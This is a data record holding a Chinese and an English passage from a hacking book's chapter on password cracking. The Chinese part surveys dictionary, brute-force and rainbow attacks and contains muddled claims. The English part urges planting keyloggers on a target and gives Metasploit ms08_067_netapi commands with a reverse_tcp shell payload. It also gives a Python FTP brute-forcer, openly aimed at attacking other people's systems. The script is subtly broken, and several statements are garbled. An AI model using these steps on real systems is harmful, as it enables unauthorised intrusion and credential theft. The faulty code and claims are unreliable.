  trans: "\n如果你最终走过了这一过程并在你所做的事情上取得了成功，那么你将成为计算机网络的一部分，你可以从该网络中获取你想要的所有信息，而没有任何人察觉到你的存在。\n\
    \n各种黑客都喜欢使用这种方法，因为这种方法为他们在此过程中完成某些自己的攻击提供了各种巨大的潜力。\n\n# 第 9 章：如何破解密码并创建我们自己的密码破解器\n\
    \n我们能够考虑处理的另一件事是如何破解密码。\n\n在我们之前的一本书中，我们花了一些时间讨论了密码有多重要，以及当面对试图进入我们网络的黑客时，密码通常是如何是我们拥有的第一道防线。\n\
    \n如果我们选择一个过于简单且易于被破解的密码，那么我们在执行过程中也会遇到一些麻烦。\n\n但如果我们选择一个独特且复杂的密码，那么黑客在想要进入网络时就会变得困难得多。\n\
    \n密码攻击通常是黑客对你尝试攻击时首先采用的手段之一。\n\n如果黑客有机会获取到你的一些密码，这将使他们更容易从系统中收集到他们想要的信息。\n\n密码和其他类似的机密信息将是你网络安全中最薄弱的部分之一，因为它们依赖于大量的保密性才能发挥作用并取得成功。\n\
    \n如果你告诉别人关于密码的信息、将密码留在容易被发现的地方，或者选择了一个弱密码，就很难保持你的网络安全。\n\n黑客还可以使用几种方法来获取你正在使用的密码。\n\
    \n这就是为什么在系统安全方面，密码被视为最薄弱的环节之一。\n\n这也是为什么许多公司在拥有非常敏感的信息时，会采取某种形式的双重保护。\n\n这有助于增加另一层保护，并可以更容易地保持所有信息的安全。\n\
    \n这里的好消息是，有一些工具你可以用来保持你的网络平安无事，免受那些可能想要利用它并为自己获利的人的影响。\n\n这就是为什么我们在这章中将花一些时间研究黑客是如何破解密码的，以及你可以尽可能保持密码安全的某些方法。\n\
    \n## 我如何才能破解密码？\n\n在这里首先需要查看的是我们如何破解目标的密码。\n\n如果黑客发现社会工程学无法按照他们想要的方式收集密码，那么他们还有其他选项可以使用，可以在无需物理访问计算机的情况下实现这一目标。\n\
    \n供我们破解这些密码的另一些工具还包括 `RainbowCrack`、`John the Ripper` 和 `Cain and Abel` 等。\n\n\
    虽然有这些工具以及其他工具可以用于破解你想要的密码，但你必须对它们进行仔细的观察，因为某些工具要求你实际上位于目标系统上，才能以你所操作的方式有效地使用它们，所以如果你想进行远程操作，它们会有点麻烦。\n\
    \n但一旦你获得了对计算机的物理访问，当你选择上述工具之一时，那里发现的所有信息（以及为了隐藏而带有密码的信息）都将属于你。\n\n## 密码加密的重要性\n\
    \n现在我们需要快速查看一下被称为密码加密的内容。\n\n我们还将查看一些用于获取并使用密码的其它黑客方法，即使密码已经经过了加密。\n\n一旦你能够在账户上创建一个新密码，它将通过一个加密算法。\n\
    \n这将产生一个我们看到的、难以阅读且加密的字符串。\n\n当然，该算法的设置使得我们无法反转现有的哈希值（hashes），这将保持密码的安全，这也是人们无法进入系统并直接看到你所使用的密码的主要原因。\n\
    \n此外，每当你想要破解 `Linux` 系统上的密码时，密码破解过程都会增加第二层难度。\n\n`Linux` 能够通过引入密码随机化的想法来增加这种新的安全级别。\n\
    \n这是通过在密码中添加“盐”（salt），有时还有另一个值来实现的，这改变了密码的唯一性，使得即使两个用户选择了相同的密码，也不会产生相同的哈希值。\n\n\
    当然，你有一些工具可供你使用，我们可以尝试使用它们来破解或恢复一些丢失的密码。\n\n你可以选择的某些选项包括：\n\n1. **字典攻击（The dictionary\
    \ attack）**：\n   通过字典攻击，程序将尝试字典中找到的单词，然后将这些单词与数据库或系统数据库中密码的哈希值进行比对。\n\n   当密码很弱或者当它们仅仅依赖于替代拼写时，这种方法将有效。例如写成\
    \ `pa$$word` 而不是 `password`。\n\n   如果你想双检网络上的所有用户都选择了强密码，那么你可以尝试这种攻击以确保正确性。\n\n\
    2. **暴力破解（A brute force attack）**：\n   这些方法可以帮助我们破解几乎任何类型的密码，因为它可以产生字符、数字和字母的组合，直到找到正确的密码。\n\
    \n   但记住，这种方法速度缓慢且需要大量时间，如果用户拥有非常强的密码并定期更改，它可能会失败。由于这种方法在输入各种组合上花费的时间很久，它通常是黑客不会浪费时间的方法。\n\
    \n3. **彩虹攻击（Rainbow attacks）**：\n   这些是我们可以用来破解系统中发现的某些哈希密码的工具，当使用良好时它们是可以成功的。与我们提到的其他两种方案相比，这种工具的速度很快。\n\
    \n   我们看到的最大的缺点是，只要密码在 14 个字符以内，它就能破解任何密码。如果密码更长，就会遇到麻烦。这也是保护免受这种攻击的一种良好方法。\n\n\
    当我们对密码进行加密时，黑客仍有可能使用上述某些工具侵入并获取他们想要的信息。但在大多数情况下，你会发现使用这种加密、使用安全网络并确保密码强大且难以猜测，是确保黑客无法进入你个人网络的最佳方法之一。\n\
    \n## 破解密码的其他方法\n\n获取你所需的密码的最佳方法之一是确保你能够访问想要使用的精确系统。\n\n当然，由于我们是在进行破解，这可能不是一种可能性，你需要诉诸\
    \ B 计划来运行。\n\n"
- fmt: "\nIf you choose to not handle some of the cracking tools that we talked about\
    \ above, there are a few other techniques that we are able to work with that include:\n\
    \n### 1. Keystroke logging\n\nWe took a look above at how we are able to create\
    \ one of our own key loggers, and you will find that if you are able to get this\
    \ onto the system of your target, it is an efficient and easy way to crack one\
    \ of the passwords that we have for that target.\n\nThis is because the key logger\
    \ is going to install a kind of recording device on the computer of your target\
    \ and then will start to track down all of the keystroke that they use before\
    \ sending that information on to you.\n\n### 2. Look for some of the weaker storage\
    \ options of passwords\n\nThere are a ton of applications that are not secure\
    \ who will try to store the password in a local location.\n\nThis is going to\
    \ make it really easy for hackers to gather up that information without a lot\
    \ of work.\n\nOnce you have been able to gain some physical access to the computer\
    \ of your target, you will find that a quick search is all that you need in order\
    \ to grab these passwords.\n\n### 3. Grab the passwords in a remote manner\n\n\
    If you find that it is impossible to get physical access to the target computer,\
    \ which is true for most hackers, it is possible to go through and gather it remotely.\n\
    \nYou will most likely need to use a spoofing attack to make this happen and then\
    \ use the exploit with a `SAM` file.\n\nA good tool to use to make this one happen\
    \ is going to be `Metasploit` because it is going to help us to get the `IP` address\
    \ that we need from our target and from the device that you are using.\n\nYou\
    \ can then take these and switch them around so that the system believes that\
    \ you are the one who is supposed to be on the system.\n\nThe code that we need\
    \ to make this happen includes:\n\n1. Open up `Metasploit` and type in the command\
    \ `msf > use exploit/windows/smb/ms08_067_netapi`.\n2. Once that is in, type in\
    \ this command `msf(ms08_067_netapi) > set payload /windows/meterpreter/reverse_tcp`.\n\
    3. After you have the two `IP` addresses on hand, you are going to type in these\
    \ commands to exploit the `IP` addresses:\n    - `msf (ms08_067_netapi) > set\
    \ RHOST [this is the target IP address]`\n    - `msf (ms08_067_netapi) > set LHOST\
    \ [this is your IP address]`\n4. now it is time to type in this command below\
    \ in order to carry out the exploit that you want to do:\n    - `msf (ms08_067_netapi)\
    \ > exploit`\n5. this is going to provide you with a terminal prompt that makes\
    \ it easier to gain the remote access that you want in order to target the computer\
    \ and then do what you would like.\n\nThe system is going to think that you belong\
    \ there because you have the right `IP` address, and you can access a lot of the\
    \ information that you shouldn’t.\n\n## How to Create Our Own Password Cracker\n\
    \nThe final thing that we are going to take a look here and learn how to do is\
    \ create one of our own password crackers.\n\nThis is a great tool to use, especially\
    \ if you are not able to get social engineering to work, and the target will not\
    \ add on the keylogger that you are planning to use.\n\nWe are able to use this\
    \ password cracker along with the `Python` language to get things to work out\
    \ and to make sure that, when it is successful, we are able to gather up the information\
    \ and the passwords that we want.\n\nIn particular, we are going to spend some\
    \ time looking at the steps to create an FTP password cracker.\n\nThis is a good\
    \ one to use because it makes it pretty easy for us to grab onto the passwords\
    \ that we would like, or to make sure that some of the passwords that we add to\
    \ our system are going to be as safe and secure as possible.\n\nTo help us get\
    \ started with this, we need to open up our `Kali` operating system and then make\
    \ sure that the text editor is all ready to go as well. when all of this is set\
    \ up, you can type in the following code to help get that FTP password cracker\
    \ ready to go:\n\n```python\n#!/usr/bin/python\n\nimport socket\nimport re\nimport\
    \ sys\n\ndef connect(username, password):\n    $ = socket.socket(socket.AF_INET,\
    \ socket.SOCK_STREAM)\n    print(\"(*) Trying\"+username+\".\"+password)\n   \
    \ s.connect(('192.168.1.105', 21))\n    data = s.recv(1024)\n    s.send('USER'+username+'\\\
    n')\n    data = s.recv(1024)\n    s.send('PASS'+password+'\\r\\n')\n    data =\
    \ s.recv(3)\n    s.send('QUIT\\r\\n')\n    s.close()\n    return data\n\nusername\
    \ = \"NuilByte\"\npasswords=[\"test\", \"backup\", \"password\", \"12345\", \"\
    root\", \"administrator\", \"ftp\", \"admin\"]\n\nfor password in passwords:\n\
    \    attempt = connect(username, password)\n    if attempt == \"230\":\n     \
    \   print(\"[*) Password found:\" + password)\n        sys.exit(0)\n```\n\nNote\
    \ that inside of this, we have imported a few of the `Python` modules, namely\
    \ `socket`, `re`, and `sys`, and then we created a `socket` that is meant to connect\
    \ through port `21` to a specific `IP` address that you pick.\n\nThen we created\
    \ a variable for the `username` and assigned the `NullByte` to it, and a list\
    \ that called `passwords` was then created.\n\nThis contains some of the passwords\
    \ that are possible and then a loop was used in order to try out all the passwords\
    \ until it goes through this list without seeing success.\n\nNow, as you go through\
    \ this part, you may notice that you are able to make some changes, especially\
    \ when it comes to the values that are inside of the script.\n\nYou can try it\
    \ out this way the first time to gain some experience with the coding and all\
    \ that it has to offer. But then, as you are ready to make your own attack and\
    \ you have some more familiarity with how this is going to work, it will be easier\
    \ to make some of these changes and still get the system to work the way that\
    \ you would like.\n\nWhen you have had a chance to make some of the changes that\
    \ you would like to the coding above so that your password cracker works the way\
    \ that you would like, or even when you have just decided to work with the code\
    \ above, it is time to save it.\n\nThe best way to do this is to name it `ftpcracker.py`\
    \ and then give yourself all of the right permissions so that you can run it.\n\
    \n# Conclusion\n\nThank you for making it through the end of Hacking with Kali\
    \ Linux, let’s hope it was informative and able to provide you with all of the\
    \ tools you need to achieve your goals whatever they may be.\n\nThe next step\
    \ is to get started with some of your own hacking adventures as soon as possible!\n"
